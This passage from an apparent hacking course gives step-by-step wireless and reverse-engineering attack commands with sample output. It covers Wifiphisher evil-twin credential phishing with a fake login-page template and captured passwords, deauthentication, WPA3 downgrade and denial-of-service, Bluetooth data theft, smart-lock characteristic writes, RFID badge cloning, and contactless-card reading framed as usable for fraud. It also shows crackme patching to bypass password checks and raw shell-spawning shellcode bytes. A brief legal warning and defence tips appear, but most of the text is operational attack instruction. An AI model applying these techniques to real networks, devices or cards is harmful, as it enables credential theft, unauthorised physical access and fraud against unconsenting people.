            <h4>Detecting Hidden SSIDs with Kismet</h4>

            <div class="code"># Many networks hide their SSID (not broadcast in beacons)
# But clients constantly probe for known networks!

# In Kismet web interface:
# 1. Look for networks with SSID: "<Hidden SSID>"
# 2. Click the network
# 3. Go to "Client Devices" tab
# 4. Watch for probe requests

# Clients send: "Is [NetworkName] here? Is [NetworkName] here?"
# Kismet captures these probes and reveals the SSID!

# Example:
# Hidden network at MAC: AA:BB:CC:DD:EE:FF
# Client probes: "Is HomeNetwork here?"
# → Kismet updates: AA:BB:CC:DD:EE:FF = "HomeNetwork"

# Force faster revelation:
# Deauth clients from the hidden network
# They'll immediately probe to reconnect!

aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Within seconds, Kismet reveals the hidden SSID</div>

            <h3>Part 2: Fern WiFi Cracker - GUI-Based WiFi Hacking</h3>

            <p><strong>Fern WiFi Cracker</strong> is a graphical tool that automates WiFi security testing. It's essentially a GUI wrapper around aircrack-ng suite, making attacks point-and-click easy!</p>

            <div class="code"># Install Fern:
sudo apt install fern-wifi-cracker

# Or from GitHub:
git clone https://github.com/savio-code/fern-wifi-cracker.git
cd fern-wifi-cracker
sudo python3 execute.py

# Launch Fern:
sudo fern-wifi-cracker

# Main interface:
# 1. Select WiFi interface (wlan0)
# 2. Click "Scan for Access Points"
# 3. Choose WEP or WPA/WPA2 tab
# 4. Select target network
# 5. Click attack type:
#    - WEP: Fake authentication, ARP replay, caffe-latte
#    - WPA: Handshake capture, deauth attack
# 6. Provide wordlist for cracking
# 7. Click "WiFi Attack"

# Fern automatically:
# ✅ Enables monitor mode
# ✅ Captures handshake
# ✅ Deauths clients
# ✅ Cracks password
# ✅ Displays results

# Features:
# • Automatic attack selection (best for each encryption)
# • Built-in wordlist manager
# • Session management (resume attacks)
# • Ethernet attacks (ARP spoofing, DNS spoofing)
# • Credential harvester (fake login pages)

# Limitations:
# • Not as flexible as manual aircrack-ng
# • Slower than command-line tools
# • Less control over parameters

# Best use: Quick audits, demos, teaching beginners</div>

            <h3>Part 3: Wifiphisher - Social Engineering WiFi Attacks</h3>

            <p><strong>Wifiphisher</strong> is a rogue access point framework for automated phishing attacks against WiFi users. It creates fake access points, jams the real network, and serves credential-stealing web pages!</p>

            <div class="metaphor-box">
                <h4>💡 Wifiphisher = The WiFi Con Artist</h4>
                <p>Imagine you're at a coffee shop. The WiFi is "CoffeeShop_Guest". Suddenly:<br><br>
                1. Your connection drops (Wifiphisher jamming real AP)<br>
                2. You see "CoffeeShop_Guest" again, connect<br>
                3. Browser opens: "Firmware Update Required - Enter WiFi Password to Continue"<br>
                4. You type your password...<br>
                5. Attacker now has the WPA password!<br><br>
                Wifiphisher automates this entire attack: jam → fake AP → phishing page → capture credentials!</p>
            </div>

            <div class="code"># Install Wifiphisher:
sudo apt install wifiphisher

# Or from GitHub:
git clone https://github.com/wifiphisher/wifiphisher.git
cd wifiphisher
sudo python3 setup.py install

# Basic attack (automated):
sudo wifiphisher

# Wifiphisher will:
# 1. Scan for networks
# 2. Display list of APs
# 3. You select target
# 4. Wifiphisher jams target AP
# 5. Creates fake AP with same SSID
# 6. Serves phishing page

# Manual mode (more control):
sudo wifiphisher -aI wlan0 -jI wlan1 -e "TargetNetwork"

# -aI wlan0    → Access point interface (creates fake AP)
# -jI wlan1    → Jamming interface (deauths real AP)
# -e "TargetNetwork" → Target SSID

# Built-in phishing scenarios:

# 1. Firmware Upgrade (most believable):
sudo wifiphisher -aI wlan0 -jI wlan1 -e "TargetNetwork" -p firmware-upgrade

# Page says: "Router firmware update required. Enter WiFi password to continue."

# 2. Browser Plugin Update:
sudo wifiphisher -p plugin_update

# Page says: "Browser plugin outdated. Install update to continue."
# Downloads malware!

# 3. OAuth Login:
sudo wifiphisher -p oauth-login

# Fake Google/Facebook login page

# 4. Network Manager Connect:
sudo wifiphisher -p network_manager_connect

# Looks like Linux network manager asking for password

# Custom phishing pages:
# Create HTML page: /etc/wifiphisher/phishing-pages/custom/
sudo mkdir -p /etc/wifiphisher/phishing-pages/custom-page/
sudo nano /etc/wifiphisher/phishing-pages/custom-page/index.html

# Use this template:
# <!DOCTYPE html>
# <html>
# <body>
#   <h1>IT Department Notice</h1>
#   <p>Your access credentials have expired.</p>
#   <form method="POST" action="/phishing/password">
#     <input type="password" name="password" placeholder="WiFi Password">
#     <button type="submit">Verify</button>
#   </form>
# </body>
# </html>

# Use custom page:
sudo wifiphisher -p custom-page

# Captured credentials saved to:
# /root/wifiphisher-credentials.txt

# Check results:
cat /root/wifiphisher-credentials.txt

# Output:
# [2026-01-08 14:30:22] Password: MySecretWiFi123
# [2026-01-08 14:32:15] Password: CompanyWiFi2026</div>

            <h4>Advanced Wifiphisher Techniques</h4>

            <div class="code"># Evil Twin + Captive Portal (no jamming):
sudo wifiphisher --nojoammer -e "FreeWiFi" -p firmware-upgrade

# Creates open "FreeWiFi" network
# When users connect, captive portal asks for "verification"
# Perfect for conferences, airports, hotels

# HTTPS phishing (SSL strip):
sudo wifiphisher --sslstrip

# Strips HTTPS from websites
# Shows padlock but serves HTTP
# Captures passwords from HTTPS sites!

# Known beacons attack:
sudo wifiphisher --knownbeacons

# Creates multiple fake APs with common SSIDs:
# - "Free WiFi"
# - "Airport WiFi"
# - "Starbucks"
# - "Hotel Guest"
# Devices auto-connect if they've seen these before!

# Handshake capture mode:
sudo wifiphisher --handshake

# Captures WPA handshakes instead of phishing
# Good for cracking passwords offline later

# Logging and verbosity:
sudo wifiphisher -v -l /tmp/wifiphisher.log

# -v = verbose output
# -l = log file location</div>

            <div class="warning-box">
                <h4>⚠️ Wifiphisher Legal Warning</h4>
                <p><strong>CRITICAL:</strong> Wifiphisher creates rogue access points and harvests credentials. This is ILLEGAL without authorization!<br><br>
                <strong>Authorized use cases ONLY:</strong><br>
                • Pentesting engagements with written permission<br>
                • Red team exercises on company networks<br>
                • Security awareness training (with user consent)<br>
                • Personal lab networks<br><br>
                <strong>NEVER use on public networks, coffee shops, airports, or any network you don't own/have permission to test!</strong><br><br>
                Penalties can include:<br>
                • Computer fraud charges<br>
                • Identity theft charges<br>
                • Wire fraud charges<br>
                • 10+ years prison in many jurisdictions<br><br>
                Use responsibly. You've been warned! 🚨</p>
            </div>

            <h3>Part 4: WPA3 Security & Attacks</h3>

            <p><strong>WPA3</strong> is the latest WiFi security standard (2018+), designed to fix WPA2 weaknesses. But it's not invulnerable!</p>

            <h4>WPA3 Improvements Over WPA2</h4>

            <div class="info-box">
                <h4>What Makes WPA3 Better?</h4>
                <p><strong>1. SAE (Simultaneous Authentication of Equals):</strong><br>
                Replaces WPA2's 4-way handshake with Dragonfly key exchange<br>
                • Protects against offline dictionary attacks<br>
                • Forward secrecy (past traffic stays encrypted even if password compromised)<br><br>
                <strong>2. Protection Against Deauth Attacks:</strong><br>
                Management frame protection (802.11w) mandatory<br>
                • Deauth frames must be encrypted and authenticated<br>
                • Can't use aireplay-ng --deauth anymore!<br><br>
                <strong>3. Individualized Data Encryption:</strong><br>
                Each device gets unique encryption key<br>
                • In WPA2, all devices share group key<br>
                • In WPA3, sniffing one device doesn't reveal others<br><br>
                <strong>4. Easy Connect (WPA3-Easy):</strong><br>
                QR code pairing for IoT devices<br>
                • No more "12345678" default passwords<br><br>
                <strong>5. 192-bit Security Suite:</strong><br>
                Optional enterprise mode with stronger crypto<br>
                • GCMP-256 encryption<br>
                • BIP-GMAC-256 management frame protection</p>
            </div>

            <h4>WPA3 Vulnerabilities - Dragonblood Attacks</h4>

            <div class="code"># WPA3 has known vulnerabilities discovered in 2019-2020:
# "Dragonblood" attacks by Mathy Vanhoef

# Vulnerability categories:

# 1. Timing-based side-channel attack
# Attacker can recover password by measuring how long authentication takes
# Requires being very close to AP (same room)
# Exploits: Some WPA3 implementations leak password info via timing

# 2. Downgrade attack
# Force WPA3 AP to use WPA2 "transition mode"
# Then attack with traditional WPA2 methods!

# Detection:
airodump-ng wlan0mon

# Look for "WPA2 WPA3" in ENC column = vulnerable to downgrade!

# Attack:
# Use wpa_supplicant to force WPA2 connection:
wpa_supplicant -i wlan0 -c wpa2_only.conf

# wpa2_only.conf:
# network={
#   ssid="TargetNetwork"
#   key_mgmt=WPA-PSK
#   psk="test"
# }

# 3. Denial of Service
# Send invalid SAE frames to crash AP
# Tool: Dragonblood PoC scripts

git clone https://github.com/vanhoefm/dragonslayer.git
cd dragonslayer

# Run DoS attack:
./dragonslayer.py wlan0 --target AA:BB:CC:DD:EE:FF --dos

# 4. Cache-based side-channel (CVE-2019-9494)
# Recover password via CPU cache timing
# Highly complex, mostly theoretical

# Current state of WPA3 attacks:
# ❌ Can't capture handshake and crack offline (main win for WPA3!)
# ✅ Can downgrade to WPA2 on some APs
# ✅ Can DoS the network
# ⚠️ Side-channel attacks possible but difficult

# Best attack vector: Social engineering (Wifiphisher!)
# WPA3 doesn't stop users from typing password into fake portal!</div>

            <h3>Part 5: Bluetooth Exploitation</h3>

            <h4>Bluetooth Basics for Hackers</h4>

            <div class="code"># Bluetooth has two main versions:
# • Bluetooth Classic (BR/EDR) - keyboards, headsets, file transfer
# • Bluetooth Low Energy (BLE/BTLE) - fitness trackers, IoT devices

# Install Bluetooth tools:
sudo apt install bluez bluez-tools

# List Bluetooth adapters:
hciconfig

# Output:
# hci0:   Type: Primary  Bus: USB
#         BD Address: 00:11:22:33:44:55  ACL MTU: 1021:8  SCO MTU: 64:1
#         UP RUNNING
#         RX bytes:1234 acl:10 sco:0 events:56 errors:0
#         TX bytes:5678 acl:10 sco:0 commands:45 errors:0

# Enable Bluetooth adapter:
sudo hciconfig hci0 up

# Scan for nearby Bluetooth devices:
sudo hcitool scan

# Output:
# Scanning ...
#     AA:BB:CC:DD:EE:FF       John's iPhone
#     11:22:33:44:55:66       Bose Headphones
#     77:88:99:AA:BB:CC       Samsung Galaxy

# Get detailed device info:
sudo hcitool info AA:BB:CC:DD:EE:FF

# Output:
# Requesting information ...
#     BD Address:  AA:BB:CC:DD:EE:FF
#     Device Name: John's iPhone
#     LMP Version: 5.0 (0x9) LMP Subversion: 0x4321
#     Manufacturer: Apple (76)

# BLE scan:
sudo hcitool lescan

# Output:
# LE Scan ...
# AA:BB:CC:DD:EE:FF Fitbit Charge 5
# 11:22:33:44:55:66 (unknown)
# 77:88:99:AA:BB:CC Mi Band 6</div>

            <h4>Bluetooth Attacks with Bluepot & Redfang</h4>

            <div class="code"># Redfang - Find hidden Bluetooth devices
# (Devices in "non-discoverable" mode)

git clone https://github.com/mister-espria/redfang.git
cd redfang
./redfang

# Brute-forces MAC addresses to find hidden devices
# Useful for finding devices that don't respond to hcitool scan

# Bluepot - Bluetooth honeypot
# Simulates vulnerable Bluetooth device to catch attackers

git clone https://github.com/andrewmichaelsmith/bluepot.git
cd bluepot
sudo python bluepot.py

# Creates fake vulnerable device
# Logs connection attempts
# Identifies attacking tools

# Bluesnarfing - Steal data from device
# (Works on old devices with OBEX vulnerabilities)

sudo apt install obexftp

# Connect and list files:
obexftp -b AA:BB:CC:DD:EE:FF -l

# Download contacts:
obexftp -b AA:BB:CC:DD:EE:FF -g telecom/pb.vcf

# Download calendar:
obexftp -b AA:BB:CC:DD:EE:FF -g telecom/cal.vcs

# Bluejacking - Send unsolicited messages
# (Harmless but annoying)

ussp-push AA:BB:CC:DD:EE:FF@10 message.txt message.txt

# Sends message.txt to device
# User sees: "Incoming file: message.txt"</div>

            <h4>BLE Hacking with Gatttool & BLESuite</h4>

            <div class="code"># BLE uses GATT (Generic Attribute Profile)
# Devices expose "services" with "characteristics" (data fields)

# Connect to BLE device:
gatttool -b AA:BB:CC:DD:EE:FF -I

# Interactive mode:
[AA:BB:CC:DD:EE:FF][LE]> connect
Attempting to connect to AA:BB:CC:DD:EE:FF
Connection successful

# List services:
[AA:BB:CC:DD:EE:FF][LE]> primary
attr handle: 0x0001, end grp handle: 0x0007 uuid: 00001800-0000-1000-8000-00805f9b34fb
attr handle: 0x0008, end grp handle: 0x000b uuid: 00001801-0000-1000-8000-00805f9b34fb
attr handle: 0x000c, end grp handle: 0xffff uuid: 0000180f-0000-1000-8000-00805f9b34fb

# List characteristics:
[AA:BB:CC:DD:EE:FF][LE]> characteristics
handle: 0x0002, char properties: 0x02, char value handle: 0x0003, uuid: 00002a00-0000-1000-8000-00805f9b34fb
handle: 0x0004, char properties: 0x02, char value handle: 0x0005, uuid: 00002a01-0000-1000-8000-00805f9b34fb

# Read characteristic:
[AA:BB:CC:DD:EE:FF][LE]> char-read-hnd 0x0003
Characteristic value/descriptor: 46 69 74 62 69 74 20 43 68 61 72 67 65

# (Hex decodes to: "Fitbit Charge")

# Write to characteristic:
[AA:BB:CC:DD:EE:FF][LE]> char-write-req 0x0010 01

# Might trigger action (turn on LED, change setting, etc.)

# BLESuite - More advanced BLE exploitation:
git clone https://github.com/nccgroup/BLESuite.git
cd BLESuite
sudo python3 setup.py install

# Scan and identify BLE devices:
ble-scan

# Enumerate GATT services:
ble-read -a AA:BB:CC:DD:EE:FF

# Smart lock exploit example:
# Many smart locks have "unlock" characteristic
# Find it, write 0x01, door unlocks!

# Fitness tracker exploit:
# Read heart rate, steps, location history
# Privacy nightmare!</div>

            <h3>Part 6: RFID/NFC Hacking</h3>

            <h4>Understanding RFID & NFC</h4>

            <div class="info-box">
                <h4>RFID vs NFC</h4>
                <p><strong>RFID (Radio Frequency Identification):</strong><br>
                • Long range (up to 100 meters for active tags)<br>
                • Used for: Access badges, inventory tracking, toll collection<br>
                • Frequencies: 125kHz (low), 13.56MHz (high), 900MHz (ultra-high)<br><br>
                <strong>NFC (Near Field Communication):</strong><br>
                • Short range (< 10cm)<br>
                • Based on 13.56MHz RFID<br>
                • Used for: Contactless payments, phone pairing, smart posters<br>
                • Two-way communication (RFID is usually one-way)<br><br>
                <strong>Why they're vulnerable:</strong><br>
                • No encryption on basic tags (125kHz)<br>
                • Easily cloned with $20 device<br>
                • Can be read from distance (RFID)<br>
                • Replay attacks possible</p>
            </div>

            <h4>RFID Cloning with Proxmark3</h4>

            <div class="code"># Proxmark3 - Professional RFID research tool (~$300)
# Can read, clone, and emulate RFID/NFC tags

# Budget alternative: ACR122U NFC reader (~$40)

# Reading 125kHz RFID card (HID Prox):
proxmark3> lf hid fskdemod

# Output:
# TAG ID: 2004e11e (printed on card)
# Full: 10004e11e (with site code)

# Clone to writable T5577 card:
proxmark3> lf hid clone 2004e11e

# Output:
# Cloning tag to T5577
# Writing block 0
# Writing block 1
# Done!

# The cloned card now works as the original!

# Reading 13.56MHz RFID/NFC (Mifare Classic):
proxmark3> hf mf chk *1 ?

# Output:
# Checking keys...
# Sector 0: Key A: FFFFFFFFFFFF (default key found!)
# Sector 1: Key A: FFFFFFFFFFFF
# [most keys are still factory default!]

# Dump entire card:
proxmark3> hf mf dump

# Creates: dumpdata.bin

# Clone to blank Mifare card:
proxmark3> hf mf restore

# Write dumpdata.bin to new card
# Perfect clone!

# NFC credit card reading:
proxmark3> hf 14a reader

# Output:
# UID: 01 02 03 04
# ATQA: 00 04
# SAK: 08 [Mifare Classic]

# Some credit cards expose:
# • Card number (PAN)
# • Expiry date
# • Cardholder name
# • Recent transaction history

# Note: Can't withdraw money (CVV not on chip)
# But: Can use for online fraud if no 2FA!</div>

            <h4>Budget RFID Hacking - ACR122U</h4>

            <div class="code"># ACR122U is USB NFC reader/writer (~$40)
# Works with libnfc

# Install libnfc:
sudo apt install libnfc-bin libnfc-examples

# List readers:
nfc-list

# Output:
# NFC device: ACS ACR122U opened

# Scan for tags:
nfc-poll

# Output when card near:
# NFC target found:
#     UID: 01 02 03 04
#     ATQA: 00 04
#     SAK: 08

# Read Mifare Classic card:
nfc-mfclassic r a dump.mfd

# Requires: Mifare Classic card
# Output: dump.mfd (full card data)

# Write to blank card:
nfc-mfclassic w a dump.mfd

# Clone complete!

# Emulate tag (turn ACR122U into virtual card):
nfc-emulate-tag

# Your reader now pretends to be a tag
# Can simulate access badge without carrying it!

# Android phone NFC hacking:
# Install: "NFC Tools" app (free)
# Can read/write NFC tags
# Limited compared to Proxmark3, but portable!</div>

            <div class="metaphor-box">
                <h4>🎉 You're a Wireless Penetration Master!</h4>
                <p>You've conquered:<br><br>
                ✅ <strong>Kismet:</strong> Advanced WiFi monitoring, wardriving, hidden SSID detection<br>
                ✅ <strong>Fern WiFi Cracker:</strong> GUI-based automated WiFi attacks<br>
                ✅ <strong>Wifiphisher:</strong> Rogue AP + social engineering credential theft<br>
                ✅ <strong>WPA3:</strong> Understanding improvements, Dragonblood attacks, limitations<br>
                ✅ <strong>Bluetooth:</strong> Classic & BLE hacking, GATT enumeration, smart device exploits<br>
                ✅ <strong>RFID/NFC:</strong> Proxmark3 cloning, access badge duplication, credit card reading<br><br>
                <strong>Wireless Attack Surface:</strong><br>
                • <strong>WiFi:</strong> WPA2 handshakes, WPA3 downgrades, evil twin APs<br>
                • <strong>Bluetooth:</strong> BLE smart locks, fitness trackers, car key fobs<br>
                • <strong>RFID:</strong> 125kHz access badges, 13.56MHz transit cards<br>
                • <strong>NFC:</strong> Contactless payment cards, phone pairing<br>
                • <strong>433MHz:</strong> Garage doors, car remotes, weather stations (SDR topic)<br>
                • <strong>ZigBee:</strong> Smart home devices (requires KillerBee tools)<br><br>
                <strong>Defense strategies:</strong><br>
                • Use WPA3 with strong passwords (16+ chars)<br>
                • Disable WPS, disable WPA2 transition mode<br>
                • Enable 802.11w (management frame protection)<br>
                • Use wired connections for critical systems<br>
                • Shield RFID badges (Faraday sleeves)<br>
                • Monitor for rogue APs (Kismet!)<br><br>
                Wireless hacking is one of the most exciting pentesting domains because it's invisible, long-range, and often underestimated by defenders. Companies spend millions on firewalls but leave WiFi wide open! 📡🔓</p>
            </div>
        </section>

        <!-- SECTION 6: Reverse Engineering Mastery -->
        <section id="reverse-engineering" class="section">
            <h2 class="section-title">Reverse Engineering Mastery</h2>
            <p class="section-intro">Reverse engineering is digital archaeology. Someone gave you a compiled binary—machine code that CPUs understand but humans can't read. Your mission: understand what it does, find vulnerabilities, bypass protections, extract secrets. Whether you're analyzing malware, cracking software, finding 0-days, or understanding proprietary protocols, reverse engineering is THE skill that separates script kiddies from elite hackers. This section covers Ghidra (NSA's free RE tool), radare2 (command-line beast), Binary Ninja (modern platform), GDB debugging, ELF analysis (Linux), and PE analysis (Windows). By the end, you'll read assembly like English!</p>

            <div class="metaphor-box">
                <h4>💡 Reverse Engineering = Reading Someone's Mind</h4>
                <p>Imagine someone hands you a locked box with no documentation. Inside are gears, circuits, and mechanisms. Your job:<br><br>
                1. <strong>Static analysis:</strong> Take it apart without turning it on (disassembly)<br>
                2. <strong>Dynamic analysis:</strong> Run it and observe behavior (debugging)<br>
                3. <strong>Decompilation:</strong> Reconstruct the original blueprints (C code from assembly)<br><br>
                <strong>Why reverse engineer?</strong><br>
                • <strong>Security:</strong> Find vulns in closed-source software<br>
                • <strong>Malware analysis:</strong> Understand what virus does<br>
                • <strong>Cracking:</strong> Bypass license checks, DRM<br>
                • <strong>Interoperability:</strong> Make different systems work together<br>
                • <strong>Learning:</strong> See how experts write optimized code<br>
                • <strong>Protocol reverse engineering:</strong> Understand proprietary network protocols<br><br>
                Every binary tells a story. Your job is to read it! 📖🔍</p>
            </div>

            <h3>Part 1: Ghidra - NSA's Reverse Engineering Framework</h3>

            <p><strong>Ghidra</strong> (pronounced "GEE-druh") is a FREE, open-source software reverse engineering suite developed by the NSA and released publicly in 2019. It rivals $10,000+ commercial tools like IDA Pro!</p>

            <h4>Installing & Launching Ghidra</h4>

            <div class="code"># Ghidra requires Java JDK 11+
sudo apt update
sudo apt install openjdk-17-jdk

# Download Ghidra from:
# https://ghidra-sre.org/

# Or install via Kali repo:
sudo apt install ghidra

# Launch Ghidra:
ghidra

# First launch creates:
# ~/.ghidra/ (settings and projects)

# Create new project:
# File → New Project → Non-Shared Project
# Name: MyReverseEngineering
# Location: /root/ghidra_projects/

# Import binary:
# File → Import File → Select binary (e.g., /bin/ls)
# Ghidra auto-detects:
#   - Format: ELF, PE, Mach-O, etc.
#   - Architecture: x86, x64, ARM, MIPS, etc.
#   - Endianness: Little, Big
# Click OK

# Analyze binary:
# Analysis → Auto Analyze
# Check all options:
#   ✅ Decompiler Parameter ID
#   ✅ Function Start Search
#   ✅ Stack
#   ✅ Reference
#   ✅ Embedded Media
#   ✅ Create Address Tables
#   ✅ ASCII Strings
# Click Analyze (takes 30 seconds to few minutes)

# Ghidra now shows:
# • All functions (left panel)
# • Disassembly (middle panel)
# • Decompiled C code (right panel)</div>

            <h4>Ghidra Interface Walkthrough</h4>

            <div class="code"># Main Ghidra window sections:

# 1. Program Trees (left)
# Shows binary structure:
#   - .text (code)
#   - .data (initialized data)
#   - .rodata (read-only data like strings)
#   - .bss (uninitialized data)

# 2. Symbol Tree (left, different tab)
# Lists all functions:
#   - Functions
#   - Labels
#   - Classes (C++ binaries)
#   - Namespaces

# 3. Listing (center)
# Disassembly view:
# Address | Bytes | Mnemonic | Operands
# 00401000 | 55 | PUSH | EBP
# 00401001 | 89 e5 | MOV | EBP, ESP
# 00401003 | 83 ec 10 | SUB | ESP, 0x10

# 4. Decompiler (right)
# Pseudo-C code:
# void main(void) {
#   int local_10;
#   local_10 = 0;
#   printf("Hello World\n");
#   return;
# }

# 5. Data Type Manager (bottom left)
# Shows structs, enums, typedefs

# 6. Console (bottom)
# Error messages, script output

# Navigation:
# • Double-click function name → jumps to function
# • Press G → Go to address
# • Press F → Find bytes/text
# • Press ; → Add comment
# • Press L → Rename variable/function
# • Press → → Follow reference
# • Press ← → Go back

# Keyboard shortcuts:
# G → Go to address
# F → Search
# L → Rename
# ; → Comment
# Ctrl+Shift+E → Edit function signature
# D → Data type (convert bytes to string, int, etc.)
# U → Undefined (undefine instruction/data)
# P → Create function
# Right-click → References to → See where used</div>

            <h4>Real Example: Reversing crackme Binary</h4>

            <div class="code"># Download practice crackme:
wget https://crackmes.one/static/crackme/5b8a37a433c5d45fc286ad83.zip
unzip 5b8a37a433c5d45fc286ad83.zip
chmod +x crackme

# Run it:
./crackme
# Enter password: test
# Output: Wrong password!

# Import into Ghidra:
# File → Import File → crackme

# Auto-analyze

# Find main function:
# Symbol Tree → Functions → main (or entry)

# Look at decompiled code:

# undefined8 main(void)
# {
#   char input [32];
#   
#   printf("Enter password: ");
#   scanf("%s", input);
#   
#   if (strcmp(input, "sup3rs3cr3t") == 0) {
#     printf("Correct! Flag: flag{you_did_it}\n");
#   } else {
#     printf("Wrong password!\n");
#   }
#   
#   return 0;
# }

# Found it! Password is: sup3rs3cr3t

# Try it:
./crackme
# Enter password: sup3rs3cr3t
# Correct! Flag: flag{you_did_it}

# More complex scenario: Obfuscated password check

# Decompiled code might show:
# if ((((input[0] ^ 0x42) == 0x11) && ((input[1] ^ 0x42) == 0x27)) &&
#     (((input[2] ^ 0x42) == 0x21 && ((input[3] ^ 0x42) == 0x21)))) {
#   printf("Correct!\n");
# }

# Solve with Python:
# >>> chr(0x11 ^ 0x42)
# 'S'
# >>> chr(0x27 ^ 0x42)
# 'e'
# >>> chr(0x21 ^ 0x42)
# 'c'
# >>> chr(0x21 ^ 0x42)
# 'c'
# Password: Secc</div>

            <h4>Ghidra Scripting with Python</h4>

            <div class="code"># Ghidra supports Python and Java scripts
# Automate analysis tasks!

# Create script:
# Window → Script Manager → New Script
# Name: find_strings.py
# Language: Python

# Example script - Find all strings containing "password":

from ghidra.program.model.listing import CodeUnitFormat

currentProgram = getCurrentProgram()
listing = currentProgram.getListing()

# Get all strings
string_list = []
for string in currentProgram.getListing().getDefinedData(True):
    if string.getDataType().getName() == "string":
        string_list.append(string.getValue())

# Filter for "password"
for s in string_list:
    if "password" in s.lower():
        print("Found: {}".format(s))

# Run script:
# Script Manager → find_strings.py → Run

# Output:
# Found: Enter password:
# Found: Wrong password!
# Found: hardcoded_password_123

# Advanced script - Rename all functions with their string references:

from ghidra.program.model.symbol import RefType

def rename_functions_by_strings():
    fm = currentProgram.getFunctionManager()
    functions = fm.getFunctions(True)  # Get all functions
    
    for func in functions:
        # Get all references from this function
        refs = func.getBody().getAddresses(True)
        for addr in refs:
            data = listing.getDataAt(addr)
            if data and data.getDataType().getName() == "string":
                string_val = data.getValue()
                # Rename function
                new_name = "func_" + string_val[:20].replace(" ", "_")
                func.setName(new_name, ghidra.program.model.symbol.SourceType.USER_DEFINED)
                print("Renamed to: {}".format(new_name))
                break

rename_functions_by_strings()

# This auto-renames functions based on strings they use!</div>

            <h3>Part 2: radare2 - Command-Line RE Framework</h3>

            <p><strong>radare2</strong> (r2) is a powerful command-line reverse engineering framework. It's fast, scriptable, and works over SSH!</p>

            <div class="code"># Install radare2:
sudo apt install radare2

# Or latest version:
git clone https://github.com/radareorg/radare2
cd radare2
sys/install.sh

# Verify:
r2 -v
# radare2 5.8.8 @ linux-x86-64

# Open binary:
r2 /bin/ls

# Or with write mode (allows patching):
r2 -w /tmp/crackme

# Basic r2 commands:

# Analyze all:
[0x00000000]> aaa

# Output:
# [x] Analyze all flags starting with sym. and entry0 (aa)
# [x] Analyze function calls (aac)
# [x] Analyze len bytes of instructions for references (aar)
# [x] Finding and parsing C++ vtables (avrr)
# [x] Skipping function emulation in debugger (aaef)
# [x] Analyzing function calls in rtti sections (aafr)
# [x] Type matching analysis for all functions (aaft)
# [x] Propagate noreturn information (aanr)
# [x] Use -AA or aaaa to perform additional experimental analysis

# List functions:
[0x00000000]> afl

# Output:
# 0x00401000    1 42           entry0
# 0x00401030    1 6            sym.imp.printf
# 0x00401040    1 6            sym.imp.scanf
# 0x00401050    4 50   -> 40   main

# Disassemble function:
[0x00000000]> pdf @ main

# Output:
# ┌ 50: int main (int argc, char **argv);
# │           ; DATA XREF from entry0 @ 0x401016
# │           0x00401050      55             push rbp
# │           0x00401051      4889e5         mov rbp, rsp
# │           0x00401054      4883ec20       sub rsp, 0x20
# │           0x00401058      488d3dc90000.  lea rdi, str.Enter_password:
# │           0x0040105f      e8ccffffff     call sym.imp.printf
# │           0x00401064      488d45e0       lea rax, [rbp - 0x20]
# │           0x00401068      4889c6         mov rsi, rax
# │           0x0040106b      488d3dc10000.  lea rdi, 0x00401033
# │           0x00401072      b800000000     mov eax, 0
# │           0x00401077      e8c4ffffff     call sym.imp.scanf

# Decompile to pseudo-C:
[0x00000000]> pdc @ main

# Output (pseudo-C):
# void main (void) {
#     char *input;
#     printf("Enter password: ");
#     scanf("%s", &input);
#     if (strcmp(input, "sup3rs3cr3t") == 0) {
#         printf("Correct!\n");
#     } else {
#         printf("Wrong!\n");
#     }
# }

# Search for strings:
[0x00000000]> iz

# Output:
# [Strings]
# Num Paddr      Vaddr      Len Size Section  Type  String
# 000 0x00002008 0x00402008  15  16 (.rodata) ascii Enter password:
# 001 0x00002018 0x00402018  11  12 (.rodata) ascii sup3rs3cr3t
# 002 0x00002024 0x00402024   8   9 (.rodata) ascii Correct!

# Search for hex bytes:
[0x00000000]> /x 4889e5

# Find references to address:
[0x00000000]> axt 0x00402018

# Output:
# main 0x401058 [DATA] lea rdi, str.sup3rs3cr3t

# Visual mode (TUI interface):
[0x00000000]> V

# Then press:
#   p → cycle views (hex, disasm, decompiler)
#   : → command mode
#   q → quit visual mode</div>

            <h4>Binary Patching with radare2</h4>

            <div class="code"># Open binary in write mode:
r2 -w crackme

# Find password check:
[0x00000000]> aaa
[0x00000000]> pdf @ main

# Let's say at 0x401077 there's:
# 0x00401077      e8c4ffffff     call sym.strcmp
# 0x0040107c      85c0           test eax, eax
# 0x0040107e      7510           jne 0x401090  ← Jump if NOT equal

# Patch JNE to JE (jump if equal → always jump):
[0x00000000]> s 0x0040107e
[0x0040107e]> pd 1

# Output:
# 0x0040107e      7510           jne 0x401090

# Write new instruction (JE = 0x74):
[0x0040107e]> wx 7510

# Wait, that's the same! Let's NOP it instead:
[0x0040107e]> wx 9090

# Or make it always jump (change JNE to JMP):
[0x0040107e]> wa jmp 0x401090

# Verify:
[0x0040107e]> pd 1
# 0x0040107e      eb10           jmp 0x401090

# Save and quit:
[0x0040107e]> q

# Now any password works!
./crackme
# Enter password: wrong
# Correct!

# More patching examples:

# NOP out entire function call:
[0x00000000]> s 0x401077
[0x00000000]> wx 9090909090  # 5 NOPs (5-byte call instruction)

# Change string:
[0x00000000]> s 0x402018  # Address of "sup3rs3cr3t"
[0x00402018]> w hello
[0x00402018]> ps  # Print string
# hello

# Write shellcode:
[0x00000000]> wx 31c048bbd19d9691d08c97ff48f7db53545f995257545e0f05
# (x64 execve("/bin/sh") shellcode)</div>

            <h4>radare2 Essential Commands Cheat Sheet</h4>

            <div class="info-box">
                <h4>r2 Command Reference</h4>
                <p><strong>Analysis:</strong><br>
                • <code>aa</code> - Analyze all functions<br>
                • <code>aaa</code> - Analyze all (deep)<br>
                • <code>aaaa</code> - Analyze all + experimental<br>
                • <code>afl</code> - List functions<br>
                • <code>afi</code> - Function info<br>
                • <code>afn newname</code> - Rename function<br><br>
                <strong>Disassembly:</strong><br>
                • <code>pdf</code> - Print disassembly of function<br>
                • <code>pd 20</code> - Print 20 instructions<br>
                • <code>pdc</code> - Print decompiled C<br>
                • <code>px 100</code> - Print 100 bytes hex<br><br>
                <strong>Navigation:</strong><br>
                • <code>s main</code> - Seek to main<br>
                • <code>s 0x401000</code> - Seek to address<br>
                • <code>s+ 10</code> - Seek forward 10 bytes<br>
                • <code>s-</code> - Undo seek<br><br>
                <strong>Searching:</strong><br>
                • <code>/ password</code> - Search string<br>
                • <code>/x 4889e5</code> - Search hex<br>
                • <code>iz</code> - List strings<br>
                • <code>axt</code> - Cross-references to<br><br>
                <strong>Patching:</strong><br>
                • <code>wx 9090</code> - Write hex<br>
